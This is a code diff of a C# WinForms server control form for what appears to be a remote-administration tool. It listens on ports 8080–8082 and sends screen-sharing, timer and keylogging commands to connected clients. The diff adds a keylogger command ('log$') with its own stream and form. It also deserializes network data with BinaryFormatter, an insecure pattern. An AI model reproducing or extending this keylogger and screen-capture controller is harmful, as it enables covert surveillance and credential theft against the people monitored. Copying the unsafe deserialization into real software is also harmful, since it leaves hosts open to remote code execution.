@@ -17,15 +17,24 @@ namespace Server
     public partial class ControlForm : Form
     {
         private TcpClient client;
-        private TcpClient dataclient;
+        private TcpClient screenClient;
+        private TcpClient logClient;
+
         private TcpListener server;
-        private TcpListener dataserver;
+        private TcpListener screenServer;
+        private TcpListener logServer;
+
         private NetworkStream mainStream;
-        private NetworkStream dataStream;
+        private NetworkStream screenStream;
+        private NetworkStream keylogStream;
+
+
         private static ManualResetEvent mre = new ManualResetEvent(false);
-        private readonly Thread Listening;
-        
+
+        private readonly Thread Listening;  
         private Thread GetImage;
+        private Thread KeyLogger;
+
         bool stopsharing = false;
         public ControlForm()
         {
@@ -44,11 +53,13 @@ namespace Server
             try
             {
                 server.Start();
-                dataserver.Start();
+                screenServer.Start();
+                logServer.Start();
                 while (true)
                 {                             
                     client = server.AcceptTcpClient();
-                    dataclient = dataserver.AcceptTcpClient();
+                    screenClient = screenServer.AcceptTcpClient();
+                    logClient = logServer.AcceptTcpClient();
 
                     Random random = new Random();
                     int length = 10;
@@ -62,7 +73,7 @@ namespace Server
                     Byte[] sendsecret = Encoding.ASCII.GetBytes("secrete:" + secret + "$");
                     mainStream.Write(sendsecret, 0, sendsecret.Length);
 
-                    MessageBox.Show(secret);
+                    //MessageBox.Show(secret);
 
 
                 }
@@ -76,7 +87,8 @@ namespace Server
         private void StopListening()
         {
             server.Stop();
-            dataserver.Stop();
+            screenServer.Stop();
+            logServer.Stop();
             if (Listening.IsAlive)
                 Listening.Abort();
             //if (GetImage.IsAlive)
@@ -101,8 +113,8 @@ namespace Server
                         mre.WaitOne();
                         
                     }
-                    dataStream = dataclient.GetStream();
-                    ScreenCapture.Image = (Image)binaryFormatter.Deserialize(dataStream);
+                    screenStream = screenClient.GetStream();
+                    ScreenCapture.Image = (Image)binaryFormatter.Deserialize(screenStream);
                     
                 }
                 //else
@@ -113,53 +125,85 @@ namespace Server
         private void btnShareScreen_Click(object sender, EventArgs e)
         {
             //Thread GetImage; 
+            try
+            {
+                if (btnShareScreen.Text == "Share screen")
+                {           
+                    mainStream = client.GetStream();
+                    Byte[] ShareScreenComand = Encoding.ASCII.GetBytes("Share Screen$");
+                    mainStream.Write(ShareScreenComand, 0, ShareScreenComand.Length);
 
-            if (btnShareScreen.Text == "Share screen")
-            {           
-                mainStream = client.GetStream();
-                Byte[] ShareScreenComand = Encoding.ASCII.GetBytes("Share Screen$");
-                mainStream.Write(ShareScreenComand, 0, ShareScreenComand.Length);
-
-                stopsharing = false;
-                //MessageBox.Show(mre.GetType().ToString());
-                if (!GetImage.IsAlive)
-                {
-                    //GetImage = new Thread(ReceiveImage);
-                    GetImage.Start();
-                }
-                else
-                    mre.Set();
+                    stopsharing = false;
+                    //MessageBox.Show(mre.GetType().ToString());
+                    if (!GetImage.IsAlive)
+                    {
+                        //GetImage = new Thread(ReceiveImage);
+                        GetImage.Start();
+                    }
+                    else
+                        mre.Set();
                 
 
+                    btnShareScreen.Text = "Stop sharing";
+                }
 
+                else if(btnShareScreen.Text == "Stop sharing")
+                {
+                    StopSharing();
+                    mainStream = client.GetStream();
+                    Byte[] StopShareScreenComand = Encoding.ASCII.GetBytes("Stop Share Screen$");
+                    mainStream.Write(StopShareScreenComand, 0, StopShareScreenComand.Length);
 
-                btnShareScreen.Text = "Stop sharing";
+                    btnShareScreen.Text = "Share screen";
+                }    
             }
-            else if(btnShareScreen.Text == "Stop sharing")
+            catch(Exception)
             {
-                StopSharing();
-                mainStream = client.GetStream();
-                Byte[] StopShareScreenComand = Encoding.ASCII.GetBytes("Stop Share Screen$");
-                mainStream.Write(StopShareScreenComand, 0, StopShareScreenComand.Length);
+                MessageBox.Show("0 client connected");
+            }
 
-                btnShareScreen.Text = "Share screen";
-
-
-            }    
         }
 
         private void ControlForm_Load(object sender, EventArgs e)
         {
             server = new TcpListener(IPAddress.Any, 8080);
-            dataserver = new TcpListener(IPAddress.Any, 8081);
+            screenServer = new TcpListener(IPAddress.Any, 8081);
+            logServer = new TcpListener(IPAddress.Any, 8082);
             Listening.Start();
         }
 
         private void btnHenGio_Click(object sender, EventArgs e)
         {
-            mainStream = client.GetStream();
-            Form HenGio = new HenGio(mainStream);
-            HenGio.Show();
+            try
+            {
+                mainStream = client.GetStream();
+                Form HenGio = new HenGio(mainStream);
+                HenGio.Show();
+            }
+            catch(Exception)
+            {
+                MessageBox.Show("0 client connected");
+            }
+
+        }
+
+        private void btnLogger_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                mainStream = client.GetStream();
+
+                Byte[] LogComand = Encoding.ASCII.GetBytes("log$");
+                mainStream.Write(LogComand, 0, LogComand.Length);
+
+                Form Keylog = new Keylogger(logClient);
+                Keylog.Show();
+            }
+            catch(Exception ex)
+            {
+                MessageBox.Show("0 client connected");
+            }
+
         }
     }
 }
